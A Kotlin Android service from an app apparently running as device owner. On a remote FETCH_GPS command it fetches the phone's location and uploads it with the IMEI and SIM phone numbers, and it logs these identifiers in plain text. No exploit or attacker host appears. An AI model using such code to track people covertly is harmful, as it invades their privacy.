package com.renew.jss.service

import android.Manifest
import android.annotation.SuppressLint
import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.os.Build
import android.os.Looper
import android.telephony.TelephonyManager
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit
import com.google.android.gms.location.*
import com.renew.jss.DeviceOwnerReceiver
import com.renew.jss.utils.PhoneManager
import com.renew.jss.ApiConfig

/**
 * ?? GPS FETCH SERVICE - Handles GPS location fetching and sending to backend
 * 
 * This service is triggered by FETCH_GPS command from Socket or FCM
 * and fetches current device location to send to backend.
 */
object GpsFetchService {
    
    private const val TAG = "GpsFetchService"
    private const val LOCATION_UPDATE_TIMEOUT_MS = 30000L // 30 seconds
    // Opt #5: Reuse one OkHttpClient (thread pool + connection pool) for all location uploads.
    private val client = OkHttpClient()
    
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private var locationCallback: LocationCallback? = null
    private var isLocationSending = false // Prevent duplicate sends
    
    /**
     * ?? Main entry point - Handle GPS fetch command
     */
    fun handleGpsFetchCommand(context: Context) {
        Log.d(TAG, "soc-loc ?? Handling GPS fetch command")
        
        try {
            // Initialize location client
            fusedLocationClient = LocationServices.getFusedLocationProviderClient(context)
            
            // Fetch current location
            fetchCurrentLocation(context)
            
        } catch (e: Exception) {
            Log.e(TAG, "soc-loc ? Failed to handle GPS fetch command: ${e.message}")
        }
    }
    
    /**
     * ?? Fetch current device location
     */
    @SuppressLint("MissingPermission")
    private fun fetchCurrentLocation(context: Context) {
        Log.d(TAG, "soc-loc ?? Fetching current location...")
        
        try {
            // Check permissions first (like competitor)
            if (!hasLocationPermissions(context)) {
                Log.e(TAG, "soc-loc ? Location permissions not granted")
                sendFallbackLocation(context, getDeviceImei(context) ?: return)
                return
            }
            
            // Use modern getCurrentLocation API (like competitor)
            fusedLocationClient.getCurrentLocation(
                Priority.PRIORITY_HIGH_ACCURACY,
                null
            ).addOnSuccessListener { location: Location? ->
                if (location != null) {
                    Log.d(TAG, "soc-loc ?? Got current location: ${location.latitude}, ${location.longitude}")
                    sendLocationToBackend(context, location)
                } else {
                    Log.d(TAG, "soc-loc ?? No location available, requesting fresh location...")
                    requestFreshLocation(context)
                }
            }.addOnFailureListener { e ->
                Log.e(TAG, "soc-loc ? Failed to get current location: ${e.message}")
                requestFreshLocation(context)
            }
                
        } catch (e: Exception) {
            Log.e(TAG, "soc-loc ? Exception fetching location: ${e.message}")
            requestFreshLocation(context)
        }
    }
    
    /**
     * ?? Check location permissions (like competitor)
     */
    private fun hasLocationPermissions(context: Context): Boolean {
        return try {
            // Check if permissions are actually granted
            val fineLocation = context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)
            val coarseLocation = context.checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION)
            val hasFine = fineLocation == android.content.pm.PackageManager.PERMISSION_GRANTED
            val hasCoarse = coarseLocation == android.content.pm.PackageManager.PERMISSION_GRANTED
            
            Log.d(TAG, "soc-loc ?? Permission check - Fine: $hasFine, Coarse: $hasCoarse")
            
            // If not granted, we cannot fetch location
            if (!hasFine || !hasCoarse) {
                Log.w(TAG, "soc-loc ⚠️ Permissions missing, returning false")
                return false
            }
            
            return hasFine || hasCoarse
        } catch (e: Exception) {
            Log.e(TAG, "soc-loc ? Error checking permissions: ${e.message}")
            false
        }
    }
    
    /**
     * ?? Request fresh location updates
     */
    @SuppressLint("MissingPermission")
    private fun requestFreshLocation(context: Context) {
        Log.d(TAG, "soc-loc ?? Requesting fresh location...")
        
        try {
            val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 10000)
                .setWaitForAccurateLocation(false)
                .setMinUpdateIntervalMillis(5000)
                .setMaxUpdateDelayMillis(15000)
                .build()
            
            locationCallback = object : LocationCallback() {
                override fun onLocationResult(locationResult: LocationResult) {
                    val location = locationResult.lastLocation
                    if (location != null) {
                        Log.d(TAG, "soc-loc ?? Got fresh location: ${location.latitude}, ${location.longitude}")
                        sendLocationToBackend(context, location)
                        stopLocationUpdates()
                    }
                }
                
                override fun onLocationAvailability(availability: LocationAvailability) {
                    if (!availability.isLocationAvailable) {
                        Log.w(TAG, "soc-loc ?? Location not available")
                        stopLocationUpdates()
                    }
                }
            }
            
            fusedLocationClient.requestLocationUpdates(
                locationRequest,
                locationCallback!!,
                Looper.getMainLooper()
            )
            
            // Set timeout to stop location updates if no location received
            android.os.Handler(Looper.getMainLooper()).postDelayed({
                if (locationCallback != null) {
                    Log.w(TAG, "soc-loc ?? Location request timeout")
                    stopLocationUpdates()
                }
            }, LOCATION_UPDATE_TIMEOUT_MS)
            
        } catch (e: Exception) {
            Log.e(TAG, "soc-loc ? Exception requesting fresh location: ${e.message}")
        }
    }
    
    /**
     * ?? Stop location updates
     */
    private fun stopLocationUpdates() {
        try {
            locationCallback?.let { callback ->
                fusedLocationClient.removeLocationUpdates(callback)
                locationCallback = null
                Log.d(TAG, "soc-loc ?? Location updates stopped")
            }
        } catch (e: Exception) {
            Log.e(TAG, "soc-loc ? Failed to stop location updates: ${e.message}")
        }
    }
    
    /**
     * ?? Send location to backend
     */
    private fun sendLocationToBackend(context: Context, location: Location) {
        // Prevent duplicate sends
        if (isLocationSending) {
            Log.d(TAG, "soc-loc ?? Location already being sent, skipping duplicate")
            return
        }
        
        isLocationSending = true
        Log.d(TAG, "soc-loc ?? Sending location to backend...")
        
        try {
            val imei = getDeviceImei(context)
            if (imei == null) {
                Log.e(TAG, "soc-loc ? Cannot send location: IMEI is null")
                isLocationSending = false
                return
            }
            
            // Get phone numbers from SIM cards
            val phoneNumbers = PhoneManager.getPhoneNumbers(context)
            Log.d(TAG, "soc-loc ?? Phone numbers retrieved - SIM1: '${phoneNumbers["sim1"]}', SIM2: '${phoneNumbers["sim2"]}'")
            
            val jsonBody = """
                {
                    "latitude": "${location.latitude}",
                    "longitude": "${location.longitude}",
                    "location_timestamp": "${location.time}",
                    "imei": "$imei",
                    "sim1": "${phoneNumbers["sim1"]}",
                    "sim2": "${phoneNumbers["sim2"]}"
                }
            """.trimIndent()
            
            Log.d(TAG, "soc-loc ?? Sending to backend - IMEI: $imei, Location: ${location.latitude}, ${location.longitude}")
            Log.d(TAG, "soc-loc ?? JSON payload: $jsonBody")
            

            val mediaType = "application/json; charset=utf-8".toMediaType()
            val requestBody = jsonBody.toRequestBody(mediaType)
            
            val request = Request.Builder()
                .url(ApiConfig.Api.SET_DEVICE_LOCATION)
                .post(requestBody)
                .build()
            
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "soc-loc ? Failed to send location to backend: ${e.message}")
                    isLocationSending = false
                    // Send fallback values on failure
                    sendFallbackLocation(context, imei)
                }
                
                override fun onResponse(call: Call, response: Response) {
                    try {
                        val responseBody = response.body?.string()
                        if (response.isSuccessful && responseBody != null) {
                            Log.d(TAG, "soc-loc ? Location sent to backend successfully: $responseBody")
                        } else {
                            Log.e(TAG, "soc-loc ? Backend location upload failed: ${response.code}")
                            // Don't send fallback on 404 - might be duplicate issue
                            if (response.code != 404) {
                                sendFallbackLocation(context, imei)
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "soc-loc ? Failed to read backend response: ${e.message}")
                        // Send fallback values on exception
                        sendFallbackLocation(context, imei)
                    } finally {
                        isLocationSending = false
                    }
                }
            })
            
        } catch (e: Exception) {
            Log.e(TAG, "soc-loc ? Exception sending location to backend: ${e.message}")
            isLocationSending = false
            // Send fallback values on exception
            val imei = getDeviceImei(context)
            if (imei != null) {
                sendFallbackLocation(context, imei)
            }
        }
    }
    
    /**
     * ?? Send fallback location (00000) to backend
     */
    private fun sendFallbackLocation(context: Context, imei: String) {
        Log.d(TAG, "soc-loc ?? Sending fallback location (00000) to backend...")
        
        try {
            // Get phone numbers from SIM cards
            val phoneNumbers = PhoneManager.getPhoneNumbers(context)
            Log.d(TAG, "soc-loc ?? Fallback phone numbers - SIM1: '${phoneNumbers["sim1"]}', SIM2: '${phoneNumbers["sim2"]}'")
            
            val jsonBody = """
                {
                    "latitude": "0.00000",
                    "longitude": "0.00000",
                    "location_timestamp": "${System.currentTimeMillis()}",
                    "imei": "$imei",
                    "sim1": "${phoneNumbers["sim1"]}",
                    "sim2": "${phoneNumbers["sim2"]}"
                }
            """.trimIndent()
            
            Log.d(TAG, "soc-loc ?? Sending fallback to backend - IMEI: $imei, Location: 0.00000, 0.00000")
            Log.d(TAG, "soc-loc ?? Fallback JSON payload: $jsonBody")
            

            val mediaType = "application/json; charset=utf-8".toMediaType()
            val requestBody = jsonBody.toRequestBody(mediaType)
            
            val request = Request.Builder()
                .url(ApiConfig.Api.SET_DEVICE_LOCATION)
                .post(requestBody)
                .build()
            
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "soc-loc ? Failed to send fallback location: ${e.message}")
                }
                
                override fun onResponse(call: Call, response: Response) {
                    try {
                        val responseBody = response.body?.string()
                        if (response.isSuccessful && responseBody != null) {
                            Log.d(TAG, "soc-loc ? Fallback location sent successfully: $responseBody")
                        } else {
                            Log.e(TAG, "soc-loc ? Fallback location upload failed: ${response.code}")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "soc-loc ? Failed to read fallback response: ${e.message}")
                    }
                }
            })
            
        } catch (e: Exception) {
            Log.e(TAG, "soc-loc ? Exception sending fallback location: ${e.message}")
        }
    }
    
    /**
     * Get device IMEI
     */
    private fun getDeviceImei(context: Context): String? {
        return try {
            val prefs = context.getSharedPreferences("user_prefs", Context.MODE_PRIVATE)
            prefs.getString("user_imei1", null)
        } catch (e: Exception) {
            Log.e(TAG, "soc-loc ? Failed to get saved IMEI: ${e.message}")
            null
        }
    }
}




